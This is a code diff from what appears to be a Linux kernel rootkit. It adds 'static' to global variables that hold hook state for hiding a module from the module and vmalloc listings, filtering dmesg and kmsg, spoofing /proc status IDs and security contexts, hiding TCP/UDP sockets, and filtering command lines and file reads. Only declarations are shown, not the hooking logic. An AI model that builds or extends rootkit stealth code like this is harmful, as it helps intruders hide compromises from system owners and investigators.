@@ -73,73 +73,73 @@ struct neverc_krt_file_spoof_entry {
 	int  replace_len;
 };
 
-/* ---- internal variables ---- */
+/* ---- internal variables (file-local) ---- */
 
-neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
-neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
-void                      *_neverc_krt_module_mutex;
-neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
-neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
-int                        _neverc_krt_hide_inited;
+static neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
+static neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
+static void                      *_neverc_krt_module_mutex;
+static neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
+static neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
+static int                        _neverc_krt_hide_inited;
 
-neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
-const char                *_neverc_krt_hide_target_name;
+static neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
+static const char                *_neverc_krt_hide_target_name;
 
-neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
-unsigned long              _neverc_krt_hide_mod_start;
-unsigned long              _neverc_krt_hide_mod_end;
+static neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
+static unsigned long              _neverc_krt_hide_mod_start;
+static unsigned long              _neverc_krt_hide_mod_end;
 
-struct _neverc_krt_pid_actor_slot
+static struct _neverc_krt_pid_actor_slot
 	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];
 
-struct neverc_krt_hook     _neverc_krt_mounts_hook;
-struct neverc_krt_mount_filter _neverc_krt_mnt_filter;
-neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;
+static struct neverc_krt_hook     _neverc_krt_mounts_hook;
+static struct neverc_krt_mount_filter _neverc_krt_mnt_filter;
+static neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;
 
-neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
-unsigned long              _neverc_krt_vmalloc_hide_start;
-unsigned long              _neverc_krt_vmalloc_hide_end;
+static neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
+static unsigned long              _neverc_krt_vmalloc_hide_start;
+static unsigned long              _neverc_krt_vmalloc_hide_end;
 
-struct neverc_krt_hook_ctx _neverc_krt_dmesg_ctx_hook;
-int                        _neverc_krt_dmesg_hooked;
-char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
-int                        _neverc_krt_dmesg_filter_cnt;
-int                        _neverc_krt_dmesg_fmt_reg;
+static struct neverc_krt_hook_ctx _neverc_krt_dmesg_ctx_hook;
+static int                        _neverc_krt_dmesg_hooked;
+static char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
+static int                        _neverc_krt_dmesg_filter_cnt;
+static int                        _neverc_krt_dmesg_fmt_reg;
 
-struct neverc_krt_hook     _neverc_krt_kmsg_read_hook;
-neverc_krt_kmsg_read_fn    _neverc_krt_orig_kmsg_read;
-int                        _neverc_krt_kmsg_read_hooked;
+static struct neverc_krt_hook     _neverc_krt_kmsg_read_hook;
+static neverc_krt_kmsg_read_fn    _neverc_krt_orig_kmsg_read;
+static int                        _neverc_krt_kmsg_read_hooked;
 
-struct neverc_krt_hook     _neverc_krt_proc_status_hook;
-neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
-int                        _neverc_krt_proc_status_hooked;
-u32 _neverc_krt_status_spoof_uid = 0xFFFFFFFFU;
-u32 _neverc_krt_status_spoof_gid = 0xFFFFFFFFU;
-neverc_krt_seq_printf_fn   _neverc_krt_seq_printf_fn;
+static struct neverc_krt_hook     _neverc_krt_proc_status_hook;
+static neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
+static int                        _neverc_krt_proc_status_hooked;
+static u32 _neverc_krt_status_spoof_uid = 0xFFFFFFFFU;
+static u32 _neverc_krt_status_spoof_gid = 0xFFFFFFFFU;
+static neverc_krt_seq_printf_fn   _neverc_krt_seq_printf_fn;
 
-struct neverc_krt_hook     _neverc_krt_proc_attr_hook;
-neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
-int                        _neverc_krt_proc_attr_hooked;
-const char                *_neverc_krt_attr_fake_ctx;
+static struct neverc_krt_hook     _neverc_krt_proc_attr_hook;
+static neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
+static int                        _neverc_krt_proc_attr_hooked;
+static const char                *_neverc_krt_attr_fake_ctx;
 
-struct neverc_krt_net_hide_state _neverc_krt_net_hide;
-neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
-neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
-neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
-neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;
+static struct neverc_krt_net_hide_state _neverc_krt_net_hide;
+static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
+static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
+static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
+static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;
 
-struct neverc_krt_hook     _neverc_krt_cmdline_hook;
-neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
-int                        _neverc_krt_cmdline_hooked;
-char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
-int                        _neverc_krt_cmdline_filter_cnt;
+static struct neverc_krt_hook     _neverc_krt_cmdline_hook;
+static neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
+static int                        _neverc_krt_cmdline_hooked;
+static char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
+static int                        _neverc_krt_cmdline_filter_cnt;
 
-struct neverc_krt_hook     _neverc_krt_vfs_read_hook;
-neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
-int                        _neverc_krt_vfs_read_hooked;
-struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
-int                        _neverc_krt_file_spoof_cnt;
-int                        _neverc_krt_file_dentry_probed;
+static struct neverc_krt_hook     _neverc_krt_vfs_read_hook;
+static neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
+static int                        _neverc_krt_vfs_read_hooked;
+static struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
+static int                        _neverc_krt_file_spoof_cnt;
+static int                        _neverc_krt_file_dentry_probed;
 
 #define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF
 
